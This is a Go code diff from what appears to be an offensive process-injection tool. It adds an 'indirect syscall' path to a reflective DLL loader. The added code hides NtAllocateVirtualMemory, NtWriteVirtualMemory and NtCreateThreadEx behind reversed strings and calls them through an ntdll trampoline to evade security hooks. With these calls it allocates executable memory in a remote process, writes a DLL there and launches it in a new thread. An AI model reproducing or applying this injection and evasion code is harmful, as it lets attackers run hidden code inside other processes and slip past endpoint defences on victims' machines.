@@ -376,6 +376,39 @@ func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32
 		lpRemoteLibraryBuffer = baseA
 	}
 
+	if call_mode == "indirect" {
+		jump_sys := utils.ParseNTDLL()
+		dwSize2 := uintptr(dwSize) // need to this because dwSize is uint32. dwSize2 := 0x1000 would have worked too
+		protect = syscall.PAGE_EXECUTE_READWRITE
+		alloctype = 0x3000 //MEM_COMMIT | MEM_RESERVE
+
+		function_name := "yromeMlautriVetacollAtN" //NtAllocateVirtualMemory reversed
+		err, sysid := utils.ResolveSyscallid(function_name)
+		if err != nil {
+			fmt.Println("Error during syscall ID resolve. Err :", err)
+		}
+		fmt.Println("Syscall is resolved : ", sysid)
+
+		//sysid := uint16(0x18)
+
+		fmt.Printf("Base address of allocated memory: %x\n", baseA)
+
+		r1, err := utils.IndirectSyscall(
+			sysid,                             //NtAllocateVirtualMemory
+			jump_sys,                          //tranmpoline
+			uintptr(hProcess),                 //remote process handle
+			uintptr(unsafe.Pointer(&baseA)),   //empty base address (give us something anywhere)
+			zerob,                             //0
+			uintptr(unsafe.Pointer(&dwSize2)), //pointer to size
+			alloctype,                         //commit | reserve
+			protect,                           //rwx
+		)
+		if r1 != 0 || err != nil {
+			panic(err)
+		}
+		lpRemoteLibraryBuffer = baseA
+	}
+
 	fmt.Printf("+++++MSP Base address of allocated memory: %x\n", baseA)
 
 	///////////// END NtAllocateVirtualMemory direct syscall
@@ -407,6 +440,30 @@ func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32
 		var BytesWritten uintptr
 		r1, err := utils.Syscall(
 			uint16(sysid),     //NtWriteVirtualMemory
+			uintptr(hProcess), //remote process handle
+			uintptr(unsafe.Pointer(lpRemoteLibraryBuffer)), //base address in the remote process
+			uintptr(unsafe.Pointer(lpBuffer)),              //pointer to our buffer where the dll is stored
+			uintptr(unsafe.Pointer(dwSize2)),               //size of buffer to write
+			uintptr(unsafe.Pointer(&BytesWritten)),         //optional but without it -> crash
+		)
+		if r1 != 0 || err != nil {
+			panic(err)
+		}
+	}
+	if call_mode == "indirect" {
+		jump_sys := utils.ParseNTDLL()
+		function_name := "yromeMlautriVetirWtN" //NtWriteVirtualMemory reversed
+		err, sysid := utils.ResolveSyscallid(function_name)
+		if err != nil {
+			fmt.Println("Error during syscall ID resolve. Err :", err)
+		}
+		fmt.Println("Syscall is resolved : ", sysid)
+
+		//sysid = uint16(0x3a)
+		var BytesWritten uintptr
+		r1, err := utils.IndirectSyscall(
+			uint16(sysid),     //NtWriteVirtualMemory
+			jump_sys,          //trampoline
 			uintptr(hProcess), //remote process handle
 			uintptr(unsafe.Pointer(lpRemoteLibraryBuffer)), //base address in the remote process
 			uintptr(unsafe.Pointer(lpBuffer)),              //pointer to our buffer where the dll is stored
@@ -450,6 +507,38 @@ func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32
 		//var hhosthread uintptr
 		r1, err := utils.Syscall(
 			sysid,                                  //NtCreateThreadEx
+			uintptr(unsafe.Pointer(&threadHandle)), //hthread
+			0x1FFFFF,                               //desiredaccess
+			0,                                      //objattributes
+			uintptr(hProcess),                      //processhandle
+			uintptr(remoteReflectiveLoaderOffset),  //lpstartaddress
+			uintptr(lpRemoteLibraryBuffer),         //lpparam
+			uintptr(0),                             //createsuspended
+			0,                                      //zerobits
+			0,                                      //sizeofstackcommit
+			0,                                      //sizeofstackreserve
+			0,                                      //lpbytesbuffer
+		)
+		//syscall.WaitForSingleObject(syscall.Handle(threadHandle), 0xffffffff)
+		if r1 != 0 || err != nil {
+			panic(err)
+		}
+	}
+
+	if call_mode == "indirect" {
+		jump_sys := utils.ParseNTDLL()
+		function_name := "xEdaerhTetaerCtN" //NtCreateThreadEx reversed
+		err, sysid := utils.ResolveSyscallid(function_name)
+		if err != nil {
+			fmt.Println("Error during syscall ID resolve. Err :", err)
+		}
+		fmt.Println("Syscall is resolved : ", sysid)
+		//sysid = uint16(0xc2)
+
+		//var hhosthread uintptr
+		r1, err := utils.IndirectSyscall(
+			sysid,                                  //NtCreateThreadEx
+			jump_sys,                               //trampoline
 			uintptr(unsafe.Pointer(&threadHandle)), //hthread
 			0x1FFFFF,                               //desiredaccess
 			0,                                      //objattributes
